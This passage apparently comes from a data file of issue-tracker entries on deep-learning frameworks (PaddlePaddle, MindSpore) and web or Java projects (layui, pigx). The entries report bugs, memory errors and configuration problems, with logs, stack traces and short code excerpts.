0x7f98c4fe220ap PyEval_EvalFrameEx + 23434 10 0x7f98c4fe3bcep PyEval_EvalCodeEx + 2190 11 0x7f98c4fe220ap PyEval_EvalFrameEx + 23434 12 0x7f98c4fe3bcep PyEval_EvalCodeEx + 2190 13 0x7f98c4fe220ap PyEval_EvalFrameEx + 23434 14 0x7f98c4fe3bcep PyEval_EvalCodeEx + 2190 15 0x7f98c4fe220ap PyEval_EvalFrameEx + 23434 16 0x7f98c4fe3bcep PyEval_EvalCodeEx + 2190 17 0x7f98c4fe3ce2p PyEval_EvalCode + 50 18 0x7f98c50039e0p PyRun_FileExFlags + 176 19 0x7f98c5003bbfp PyRun_SimpleFileExFlags + 239 20 0x7f98c5019454p Py_Main + 3188 21 0x7f98c42cdcddp __libc_start_main + 253 22 0x400649p"
layui.util.toDateString 总是报错，找不到,"用方法级渲染就好了，上面这样的写法为什么不行？下面的方法可以格式化时间：   <code>: &lt;table class=""layui-table"" lay-data=""{url:'http://localhost:8888/rrr/hhad/pageFindAll', page:true, id:'idTest'}"" lay-filter=""demo""&gt; &lt;thead&gt; &lt;tr&gt; &lt;th lay-data=""{type:'checkbox', fixed: 'left'}""&gt;&lt;/th&gt; &lt;th lay-data=""{field:'dModifyDate', templet : '&lt;div&gt;{{layui.util.toDateString(d.dModifyDate*1000)}}&lt;/div&gt;'}""&gt;变更日期&lt;/th&gt; //方法级渲染 table.render({ elem: '#idTest' ,url: 'http://localhost:8888/rrr/hhad/pageFindAll' ,cols: [[ ,{field:'dModifyDate', templet : '&lt;div&gt;{{layui.util.toDateString(d.dModifyDate)}}&lt;/div&gt;',title:'变更日期'}"
 [MS][LITE][master][convert]  The init_scale parameter does not take effect.,": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: ./converter_lite --fmk=CAFFE --modelFile=/tmp/host/ge/lite/net/commercial/delivery/ml_video_edit_img_segment/modelFiles/ml_video_edit_img_segment.prototxt --outputFile=ml_video_edit_img_segment --weightFile=/tmp/host/ge/lite/net/commercial/delivery/ml_video_edit_img_segment/modelFiles/ml_video_edit_img_segment.caffemodel --configFile=weight_quant.config [common_quant_param] # Supports WEIGHT_QUANT or FULL_QUANT quant_type=WEIGHT_QUANT # Weight quantization support the number of bits [0,16], Set to 0 is mixed bit quantization, otherwise it is fixed bit quantization # Full quantization support the number of bits [1,8] bit_num=0 # Layers with size of weights exceeds threshold `min_quant_weight_size` will be quantized. min_quant_weight_size=0 # Layers with channel size of weights exceeds threshold `min_quant_weight_channel` will be quantized. min_quant_weight_channel=16 [mixed_bit_weight_quant_param] init_scale=0.01 init_scale ，初始化scale，数值越大对压缩率没有影响 init_scale ，初始化scale，数值越大可以带来更大的压缩率。"
[ST][MS][NET][ASR-dynamic][GPU 1p]Too much WARNING log in train log,"ASR-dynamic网络在GPU环境1p训练，告警日志太多，请优化 / 硬件环境: /device GPU : -- MindSpore version :r1.8.0 commit_id:23b556029 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 失败版本： MindSpore 版本：编译时间20220630181541 r1.8.0 1.8分支 commit_id:23b556029 ok版本： MindSpore 版本：编译时间20220614211828 r1.8.0 master分支 commit_id:ac72a96de9e (/): /mode graph test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py cd solution_test/cases/02network/09audio/asr/train pytest -s test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py 网络训练成功，训练日志告警日志正常 走给黎明奇   <code>: 72 mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_common.h:274] CheckShapeNull] For 'BatchMatMul', the shape of input cannot contain zero, but got (16, 4, 0, 0) 36 mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_common.h:274] CheckShapeNull] For 'BatchMatMul', the shape of input cannot contain zero, but got (16, 4, 0, 32) 31 mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_common.h:274] CheckShapeNull] For 'DropoutGrad', the shape of input cannot contain zero, but got (0, 128) 12 mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_common.h:274] CheckShapeNull] For 'DropoutGrad', the shape of input cannot contain zero, but got (0, 256) 202 mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_common.h:274] CheckShapeNull] For 'MatMul', the shape of input cannot contain zero, but got (0, 128) 36 mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_common.h:274] CheckShapeNull] For 'MatMul', the shape of input cannot contain zero, but got (0, 256)"
使用resnet34 输入大小为512*512*3 运行报 OOM 错误,"我的数据大小是512<em>512</em>3。 我使用resnet 34 输入是128（把输入resize之后），稍微修改最后img_pool的 pool_size之后，可以运行。 输入变成256的时候（把在刚才基础上pool_size加倍）也可以运行。 但是输入变成512的时候理论上跟刚才思路一样，但是把pool_size加倍之后运行不了。报OOM的错误。 log文件如下：   <code>: pcloud logs -n 100 resnet34 ==========================resnet34-trainer-0n925========================== label selector: paddle-job-pserver=resnet34, desired: 2 label selector: paddle-job=resnet34, desired: 2 Starting training job: /pfs/dlnel/home/******/jobs/resnet34, num_gradient_servers: 2, trainer_id: 1, version: v2 I0831 08:26:11.740628 37 Util.cpp:166] commandline: --num_gradient_servers=2 --ports_num_for_sparse=1 --use_gpu=True --trainer_id=1 --pservers=10.1.38.13,10.1.71.4 --trainer_count=1 --num_passes=10 --ports_num=1 --port=7164 [INFO 2017-08-31 08:26:16,898 layers.py:2517] output for __conv_0__: c = 64, h = 256, w = 256, size = 4194304 [INFO 2017-08-31 08:26:16,902 layers.py:2645] output for __pool_0__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,903 layers.py:2517] output for __conv_1__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,906 layers.py:2517] output for __conv_2__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,909 layers.py:2517] output for __conv_3__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,911 layers.py:2517] output for __conv_4__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,914 layers.py:2517] output for __conv_5__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,917 layers.py:2517] output for __conv_6__: c = 64, h = 65, w = 65, size = 270400 [INFO 2017-08-31 08:26:16,919 layers.py:2517] output for __conv_7__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,921 layers.py:2517] output for __conv_8__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,924 layers.py:2517] output for __conv_9__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,926 layers.py:2517] output for __conv_10__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,928 layers.py:2517] output for __conv_11__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,931 layers.py:2517] output for __conv_12__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,933 layers.py:2517] output for __conv_13__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,935 layers.py:2517] output for __conv_14__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,937 layers.py:2517] output for __conv_15__: c = 128, h = 33, w = 33, size = 139392 [INFO 2017-08-31 08:26:16,940 layers.py:2517] output for __conv_16__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,942 layers.py:2517] output for __conv_17__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,944 layers.py:2517] output for __conv_18__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,946 layers.py:2517] output for __conv_19__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,948 layers.py:2517] output for __conv_20__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,951 layers.py:2517] output for __conv_21__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,952 layers.py:2517] output for __conv_22__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,955 layers.py:2517] output for __conv_23__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,957 layers.py:2517] output for __conv_24__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,959 layers.py:2517] output for __conv_25__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,961 layers.py:2517] output for __conv_26__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,963 layers.py:2517] output for __conv_27__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,965 layers.py:2517] output for __conv_28__: c = 256, h = 17, w = 17, size = 73984 [INFO 2017-08-31 08:26:16,967 layers.py:2517] output for __conv_29__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,968 layers.py:2517] output for __conv_30__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,970 layers.py:2517] output for __conv_31__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,972 layers.py:2517] output for __conv_32__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,974 layers.py:2517] output for __conv_33__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,976 layers.py:2517] output for __conv_34__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,977 layers.py:2517] output for __conv_35__: c = 512, h = 9, w = 9, size = 41472 [INFO 2017-08-31 08:26:16,979 layers.py:2645] output for __pool_1__: c = 512, h = 2, w = 2, size = 2048 trainer_id:1 trainer_count:2 train_list: ['/pfs/dlnel/home/******/medical/eye/data/train.00001.dat'] I0831 08:26:17.116410 37 GradientMachine.cpp:85] Initing parameters.. I0831 08:26:18.321918 37 GradientMachine.cpp:92] Init parameters done. Killed job returned 137...setting pod return message... =============================== termination log wroted..."
DS2: refactor decoder interfaces.,Refactor decoder interfaces to make adding other decoder type easier. Add and move librispeech.py and eng_vocab.txt to .   <code>: ./data ./data
使用paddle预测时，在同一个exe下执行多个program但是每次执行都在执行最后一个model,"调用的时候每次都是调用最后一个模型   <code>: place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) model_list = list() for model_filename in model_filename_list: # [infer_program, feeded_var_names, target_var] = fluid.io.load_inference_model(dirname=save_path, executor=exe) model = fluid.io.load_inference_model(dirname=model_filename, executor=exe) model_list.append(model)"
[CT][MS]动态shape索引    引入op  unsorted segment问题,"动态shape索引用例 ci工程失败 部分用例因为某个版本引入的新问题报错 / 硬件环境: /device ascend/ : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 运行用例 runtime error   <code>: def test_parser_dynamic_input_index_list_001(): class Net(nn.Cell): def __init__(self): super().__init__() def construct(self, x): index = [0, 1] x = x[index] return x class TorchNet(nn_torch.Module): def __init__(self): super().__init__() def forward(self, x): index = [0, 1] x = x[index] return x net_ms = Net() dynamic_input = Tensor(shape=(None, ), dtype=mstype.float32) net_ms.set_inputs(dynamic_input) net_pt = TorchNet() input_np = np.random.randn(5).astype(np.float32) fact = ParserFactory(net_ms, net_pt, input_np) fact.forward_cmp() &gt; fact.backward_cmp()"
大数据量导出excel时无法生成多sheet页，且设置page-size-number无效,版本号：1.3.8-beta   <code>: 1、大数据量（超过一万条）导出excel时无法生成多sheet页（按照官方文档是会默认生成多sheet，每个sheet展示一万条数据的）。 2、根据官方文档设置设置page-size-number（每个sheet包含的数据量）参数不生效，后台查询语句仍然会limit10000 ![参数不生效1](https://images.gitee.com/uploads/images/2021/0827/161024_26405540_7663212.png) ![参数不生效2](https://images.gitee.com/uploads/images/2021/0827/161112_97d150cb_7663212.png) ![无法生成sheet页](https://images.gitee.com/uploads/images/2021/0827/161234_2df2d35c_7663212.png)
move ENFORCE position,Move up the ENFORCE point to make sure the size of has been checked before reading it.   <code>: in_dims
How to set multi-core training in Docker?Malloc too much memory?,"Hello, I am using docker image and I set trainer_count to 20 in train.sh, but only 2 cores are used. And I noticed that if trainer_count &gt;=3, then errror occurs: Does anyone know why this happens?Maybe some parameters of docker need to configure? : )   <code>: BLAS : malloc too much memory"
dim (1 vs. 1),Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
[CT][MS][BatchMatmul] 需求描述中支持的类型和功能和实际支持不一致，部分类型不支持，CPU环境不支持广播,"需求描述中支持： test_batchmatmul_input_shapea_3x16x16_true_input_shapeb_3x3x16x16_fp16   <code>: @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" output = real_run_op(obj, op_name, args)"
预测的的接口的fields参数是有什么用的？,"我在这里看到了一个例子 https://github.com/PaddlePaddle/book/blob/d3050405525832c30326be496be033db2b85652a/serve/main.py#L59 https://github.com/PaddlePaddle/book/blob/develop/serve/main.py#L73 其中参数是什么？如果我用例做图像预测的，这个参数的值是什么？   <code>: fields = filter(lambda x: len(x) != 0, output_field.split("","")) r = inferer.infer([d], feeding=feeding, field=fields) field"
Variable search semantic in Scope,"won't create a variable if there has been one with the given name in the scope or any of its ancestors: This is a mistake because even if there has been one with the given name in an ancestor, we should still be able to create one in the current scope; otherwise, we couldn't implement <em>variable shadowing</em>.   <code>: Scope::CreateVarialbe(name) Variable* CreateVariable(const std::string&amp; name) { auto var = GetVariable(name); if (var) { return var; } else { auto ptr = new Variable(); name_to_var_[name] = std::unique_ptr&lt;Variable&gt;(ptr); var_to_name_[ptr] = name; return GetVariable(name); } } /** * @brief Get Variable. * * Get Variable from this Scope, this function will recursive find Variable * from it's parent scope. Return nullptr if not found. */ Variable* GetVariable(const std::string&amp; name) const { auto it = name_to_var_.find(name); if (it != name_to_var_.end()) { return it-&gt;second.get(); } else if (parent_ != nullptr) { return parent_-&gt;GetVariable(name); } else { return nullptr; } }"
TeamCity Always Fails: Insufficient GPU memory to allocation,"I found TeamCity Always Fails due to Insufficient GPU memory to allocation. A PR should be re-run several times to pass the TeamCity check. How should we solve this problem fundamentally? Following is Conv2dTransposeOp error:   <code>: [14:32:02] : [Step 1/1] ====================================================================== [14:32:02] : [Step 1/1] ERROR: test_check_grad_no_filter (__main__.TestConv2dTransposeOp) [14:32:02] : [Step 1/1] ---------------------------------------------------------------------- [14:32:02] : [Step 1/1] Traceback (most recent call last): [14:32:02] : [Step 1/1] File ""test_conv2d_transpose_op.py"", line 69, in test_check_grad_no_filter [14:32:02] : [Step 1/1] no_grad_set=set(['Filter'])) [14:32:02] : [Step 1/1] File ""/paddle/python/paddle/v2/fluid/tests/op_test.py"", line 386, in check_grad [14:32:02] : [Step 1/1] output_names, no_grad_set) [14:32:02] : [Step 1/1] File ""/paddle/python/paddle/v2/fluid/tests/op_test.py"", line 501, in _get_gradient [14:32:02] : [Step 1/1] for p_name in inputs_with_np for item in inputs_with_np[p_name] [14:32:02] : [Step 1/1] File ""/paddle/python/paddle/v2/fluid/tests/op_test.py"", line 501, in &lt;dictcomp&gt; [14:32:02] : [Step 1/1] for p_name in inputs_with_np for item in inputs_with_np[p_name] [14:32:02] : [Step 1/1] File ""/paddle/python/paddle/v2/fluid/tests/op_test.py"", line 424, in _numpy_to_lod_tensor [14:32:02] : [Step 1/1] tensor.set(np_value, place) [14:32:02] : [Step 1/1] EnforceNotMet: ptr_ should not be null [14:32:02] : [Step 1/1] Insufficient GPU memory to allocation. at [/paddle/paddle/framework/tensor.h:143]"
前端“用户管理”报错，发现这个参数不对，  role_id IN (?)，这个参数是怎么带过来的？,"环境信息 pigx版本: 3.7 是否修改包名: 否 前端“用户管理”报错， SELECT role_id, role_name, role_code, role_desc, ds_type, ds_scope, create_time, update_time, del_flag FROM sys_role WHERE role_id IN (?) AND del_flag = '0' AND sys_role.tenant_id = 1 发现这个参数不对， role_id IN (?) 这个参数是怎么带过来的？ c.p.p.a.m.SysRoleMapper.selectBatchIds : ==&gt; Parameters: 42(String) 全局异常信息 ex=nested exception is org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: java.util.NoSuchElementException: No value present The error may exist in file [D:\rongheyun-pigx\pigx\pigx-upms\pigx-upms-biz\target\classes\mapper\SysUserMapper.xml] The error may involve com.pig4cloud.pigx.admin.mapper.SysUserMapper.getUserVosPage The error occurred while executing a query Cause: java.util.NoSuchElementException: No value present org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: java.util.NoSuchElementException: No value present The error may exist in file [D:\rongheyun-pigx\pigx\pigx-upms\pigx-upms-biz\target\classes\mapper\SysUserMapper.xml] The error may involve com.pig4cloud.pigx.admin.mapper.SysUserMapper.getUserVosPage The error occurred while executing a query Cause: java.util.NoSuchElementException: No value present Caused by: org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: java.util.NoSuchElementException: No value present The error may exist in file [D:\rongheyun-pigx\pigx\pigx-upms\pigx-upms-biz\target\classes\mapper\SysUserMapper.xml] The error may involve com.pig4cloud.pigx.admin.mapper.SysUserMapper.getUserVosPage The error occurred while executing a query Cause: java.util.NoSuchElementException: No value present Caused by: java.util.NoSuchElementException: No value present at java.util.Optional.get(Optional.java:135) at com.pig4cloud.pigx.common.data.datascope.PigxDefaultDatascopeHandle.calcScope(PigxDefaultDatascopeHandle.java:62) at com.pig4cloud.pigx.common.data.datascope.DataScopeInterceptor.intercept(DataScopeInterceptor.java:78) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy298.prepare(Unknown Source) at com.baomidou.mybatisplus.core.executor.MybatisSimpleExecutor.prepareStatement(MybatisSimpleExecutor.java:92) at com.baomidou.mybatisplus.core.executor.MybatisSimpleExecutor.doQuery(MybatisSimpleExecutor.java:66) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at com.baomidou.mybatisplus.core.executor.MybatisCachingExecutor.query(MybatisCachingExecutor.java:163) at com.baomidou.mybatisplus.core.executor.MybatisCachingExecutor.query(MybatisCachingExecutor.java:90) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:147) ... 127 common frames omitted   <code>: at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) at com.sun.proxy.$Proxy191.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:223) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForIPage(MybatisMapperMethod.java:134) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:96) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:96) at com.sun.proxy.$Proxy195.getUserVosPage(Unknown Source) at com.pig4cloud.pigx.admin.service.impl.SysUserServiceImpl.getUsersWithRolePage(SysUserServiceImpl.java:194) at com.pig4cloud.pigx.admin.service.impl.SysUserServiceImpl$$FastClassBySpringCGLIB$$9ca598bb.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) at com.pig4cloud.pigx.admin.service.impl.SysUserServiceImpl$$EnhancerBySpringCGLIB$$83ecdfc4.getUsersWithRolePage(&lt;generated&gt;) at com.pig4cloud.pigx.admin.controller.SysUserController.getUserPage(SysUserController.java:605) at com.pig4cloud.pigx.admin.controller.SysUserController$$FastClassBySpringCGLIB$$7f00b979.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at com.pig4cloud.pigx.admin.controller.SysUserController$$EnhancerBySpringCGLIB$$d58361e.getUserPage(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:645) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:126) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:92) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:77) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.pig4cloud.pigx.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:87) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) at 